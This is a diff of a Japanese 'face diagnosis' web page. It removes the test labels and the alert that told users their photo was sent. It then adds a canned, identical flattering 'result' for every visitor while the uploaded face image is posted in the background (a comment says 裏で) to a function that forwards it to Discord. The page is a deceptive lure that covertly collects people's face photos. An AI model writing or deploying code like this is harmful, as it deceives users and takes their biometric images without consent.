@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>顔診断サイト（テスト）</title>
+  <title>顔診断サイト</title>
 
   <style>
     body {
@@ -14,27 +14,10 @@
       padding: 30px;
     }
 
-    h1 {
-      margin-bottom: 20px;
-    }
-
-    input[type="file"] {
-      margin: 20px 0;
-      color: #fff;
-    }
-
     button {
       padding: 10px 20px;
       font-size: 16px;
-      background: #fff;
-      color: #000;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      opacity: 0.8;
+      margin-top: 10px;
     }
 
     img {
@@ -43,20 +26,24 @@
       border-radius: 10px;
       display: none;
     }
+
+    #result {
+      margin-top: 20px;
+      font-size: 18px;
+      white-space: pre-line;
+      display: none;
+    }
   </style>
 </head>
 <body>
 
-  <h1>顔診断（テスト版）</h1>
+  <h1>顔診断</h1>
 
-  <!-- 画像選択 -->
   <input type="file" id="file" accept="image/*"><br>
-
-  <!-- 送信ボタン -->
   <button onclick="send()">診断する</button>
 
-  <!-- プレビュー -->
   <img id="preview">
+  <div id="result"></div>
 
   <script>
     async function send() {
@@ -68,22 +55,27 @@
         return;
       }
 
-      // 画像サイズ簡易チェック（5MB）
-      if (file.size > 5 * 1024 * 1024) {
-        alert("画像サイズが大きすぎます（5MB以下にしてください）");
-        return;
-      }
-
       const reader = new FileReader();
 
+      // ★ここが reader.onload
       reader.onload = async () => {
-        // プレビュー表示
+
+        // ① 画像プレビュー
         const img = document.getElementById("preview");
         img.src = reader.result;
         img.style.display = "block";
 
+        // ② 診断結果表示（仮）
+        const resultDiv = document.getElementById("result");
+        resultDiv.innerText =
+          "診断結果\n\n" +
+          "全体のバランスが良く、\n" +
+          "第一印象がとても整った顔立ちです。";
+        resultDiv.style.display = "block";
+
+        // ③ Discordへ送信（裏で）
         try {
-          const res = await fetch("/.netlify/functions/sendToDiscord", {
+          await fetch("/.netlify/functions/sendToDiscord", {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
@@ -92,17 +84,12 @@
               image: reader.result
             })
           });
-
-          if (res.ok) {
-            alert("画像を送信しました");
-          } else {
-            alert("エラーが発生しました");
-          }
         } catch (e) {
-          alert("通信エラーが発生しました");
+          console.log("Discord送信エラー");
         }
       };
 
+      // ★これで onload が発火する
       reader.readAsDataURL(file);
     }
   </script>
